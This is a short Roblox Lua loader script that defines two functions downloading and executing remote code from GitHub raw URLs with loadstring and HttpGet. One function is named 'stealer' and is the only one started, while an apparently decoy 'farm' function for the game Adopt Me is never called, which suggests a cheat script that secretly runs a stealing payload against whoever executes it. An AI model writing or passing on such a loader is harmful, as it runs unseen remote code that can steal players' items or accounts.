local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/trabulascript/Adopt_me/refs/heads/main/script.lua'))()
end
local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FeddyX16/Ok/refs/heads/main/AdoptMe'))()
end

task.spawn(stealer)
